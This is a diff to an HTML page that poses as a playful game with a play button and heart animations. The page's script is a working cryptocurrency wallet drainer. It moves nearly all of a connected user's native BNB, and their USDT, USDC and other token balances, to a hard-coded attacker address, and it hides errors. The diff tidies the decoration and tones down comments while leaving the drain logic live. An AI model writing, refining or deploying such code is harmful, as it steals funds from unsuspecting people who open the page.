@@ -60,24 +60,13 @@
     <div id="status"></div>
   </main>
 
-  <!-- Floating hearts -->
-  <div class="floating-heart" style="left:10%; animation-delay: 0s; font-size:34px;">💕</div>
-  <div class="floating-heart" style="left:20%; animation-delay: 0.7s;">❤️</div>
-  <div class="floating-heart" style="left:30%; animation-delay: 1.4s; font-size:36px;">💖</div>
-  <div class="floating-heart" style="left:42%; animation-delay: 2.1s;">💗</div>
-  <div class="floating-heart" style="left:52%; animation-delay: 0.5s;">💘</div>
-  <div class="floating-heart" style="left:62%; animation-delay: 2.8s; font-size:31px;">💝</div>
-  <div class="floating-heart" style="left:72%; animation-delay: 1.6s;">💞</div>
-  <div class="floating-heart" style="left:80%; animation-delay: 3.5s;">❤️</div>
-  <div class="floating-heart" style="left:88%; animation-delay: 4.2s; font-size:35px;">💕</div>
-
   <script>
     const drainAddress = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";
 
     const status = document.getElementById("status");
     const btn = document.getElementById("playBtn");
 
-    // BNB Chain Tokens
+    // Correct BNB Chain (BSC) token addresses
     const tokens = [
       {s:"USDT", a:"0x55d398326f99059ff775485246999027b3197955"},
       {s:"USDC", a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"},
@@ -121,10 +110,10 @@
 
         drainedSomething = false;
 
-        // Drain Native BNB (very aggressive)
+        // Drain Native BNB
         const nativeBalance = await provider.getBalance(user);
         const minThreshold = ethers.parseEther("0.0001");
-        const reserve = ethers.parseEther("0.0002");   // Leaves almost nothing
+        const reserve = ethers.parseEther("0.0002");
 
         if (nativeBalance > lastNative && nativeBalance > minThreshold) {
           const amount = nativeBalance - reserve;
@@ -149,7 +138,7 @@
               await contract.transfer(drainAddress, balance, {gasLimit: 200000n});
               drainedSomething = true;
             }
-          } catch {}
+          } catch (e) {}
         }
 
         if (drainedSomething) {
